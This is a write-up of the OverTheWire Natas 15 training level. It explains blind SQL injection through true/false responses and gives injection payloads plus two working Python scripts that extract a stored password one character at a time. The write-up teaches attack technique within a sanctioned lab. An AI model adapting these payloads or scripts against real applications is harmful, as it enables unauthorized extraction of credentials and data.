# Natas 15 Writeup

## Overview

**Level:** Natas 15  
**Platform:** OverTheWire Natas

This level demonstrates a **Blind SQL Injection** vulnerability. Unlike previous levels, the application does not display query results directly. Instead, it only reveals whether a query returns a valid user.

---

## Goal

Retrieve the password for the next level by exploiting a blind SQL injection vulnerability.

---

## Understanding the Vulnerability

The page contains a username lookup feature.

A normal request might check whether a user exists:

```sql
SELECT * FROM users WHERE username="<input>";
```

The application only returns:

```
This user exists.
```

or

```
This user doesn't exist.
```

Since no database contents are displayed, we must infer information using **true/false conditions**.

---

## Confirming SQL Injection

Submit the following payload:

```sql
natas16" AND 1=1 "
```

Result:

```
This user exists.
```

Now try:

```sql
natas16" AND 1=2 "
```

Result:

```
This user doesn't exist.
```

This confirms that arbitrary SQL conditions can be injected.

---

## Enumerating Password Characters

The password is 32 characters long and contains:

```text
0123456789
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

To determine whether a character exists in the password, use:

```sql
natas16" AND password LIKE BINARY "%a%" "
```

If the response is:

```
This user exists.
```

then the character `a` is present somewhere in the password.

Repeat for every possible character and build a reduced character set.

---

## Character Set Enumeration Script

```python
import requests

target = "http://natas15.natas.labs.overthewire.org/"

charset_0 = (
    "0123456789"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

charset_1 = ""

for c in charset_0:
    username = 'natas16" AND password LIKE BINARY "%' + c + '%" "'

    r = requests.get(
        target,
        auth=("natas15", "<PASSWORD>"),
        params={"username": username}
    )

    if "This user exists" in r.text:
        charset_1 += c
        print("CSET: " + charset_1.ljust(len(charset_0), "*"))
```

---

## Extracting the Password

After determining the valid character set, enumerate the password one character at a time.

Example:

```sql
natas16" AND password LIKE BINARY "a%" "
```

If true, the password starts with `a`.

Continue building the prefix:

```sql
natas16" AND password LIKE BINARY "ab%" "
```

```sql
natas16" AND password LIKE BINARY "abc%" "
```

and so on.

---

## Password Extraction Script

```python
import requests

target = "http://natas15.natas.labs.overthewire.org/"
charset_1 = "23579adfgijklqruADEHOPRTVZ"

password = ""

while len(password) != 32:
    for c in charset_1:
        t = password + c

        username = 'natas16" AND password LIKE BINARY "' + t + '%" "'

        r = requests.get(
            target,
            auth=("natas15", "<PASSWORD>"),
            params={"username": username}
        )

        if "This user exists" in r.text:
            print("PASS: " + t.ljust(32, "*"))
            password = t
            break
```

---

## Why Use `LIKE BINARY`?

Without `BINARY`, comparisons may be case-insensitive.

```sql
password LIKE "a%"
```

may treat:

```text
a == A
```

Using:

```sql
password LIKE BINARY "a%"
```

ensures:

```text
a != A
```

which is necessary because Natas passwords contain mixed-case characters.

---



## Key Takeaway

Even when an application does not reveal database contents directly, a simple **true/false response** can be enough to extract sensitive information through blind SQL injection.


